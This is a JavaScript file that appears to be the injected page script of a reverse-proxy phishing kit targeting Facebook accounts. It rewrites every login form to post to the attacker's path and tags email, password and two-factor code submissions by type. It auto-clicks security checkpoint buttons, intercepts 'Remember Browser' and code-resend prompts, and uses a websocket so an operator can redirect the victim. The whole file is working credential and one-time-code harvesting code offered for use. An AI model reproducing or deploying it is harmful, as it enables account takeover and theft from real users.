const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "desktop-home-login",
        querys: [
            `[name="email"]`,
            `[id="email"]`,
            `[placeholder="Email address or phone number"]`,
            `[name="pass"]`,
            `[id="pass"]`,
            `[placeholder="Password"]`,
            `[type="submit"]`
        ]
    },
    {
        spikeType: "login-code",
        querys: [
            `[name="approvals_code"]`,
            `[type="submit"]`
        ]
    },
    {
        spikeType: "mobile-home-login",
        querys: [
            `[id="m_login_email"]`,
            `[id="m_login_password"]`,
            `[name="login"]`
        ],
        runner() {
            document.querySelector(`[id="m_login_email"]`).type = "text"
            document.querySelector(`[name="login"]`).type = "submit"
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "recent-login",
        runner() {
            const t = document.body.innerText
            if (t.includes("Review recent login") && t.includes("Someone recently tried to log in to your account from an unrecognised computer or mobile browser. Because you set up two-factor authentication, your account has been temporarily locked. Please complete the following steps to regain access to your account.")) {
                addSpikeType(this.spikeType)
                document.querySelector(`button#checkpointSubmitButton`).click()
            }
        }
    },
    {
        spikeType: "save-browser",
        runner() {
            const t = document.body.innerText
            if (t.includes("Remember Browser") && t.includes("If you save this browser, you won't have to enter a code when you log in from this browser again.")) {
                spikeForm({
                    spikeType: this.spikeType
                })
            }
        }
    },

    {
        spikeType: "resend-login-code",
        runner() {
            document.querySelectorAll('a').forEach(atag => {
                if (atag.innerText.includes("Didn't receive a code?")) {
                    atag.removeAttribute("href")
                    atag.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType
                        })
                    })
                }
            })
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}
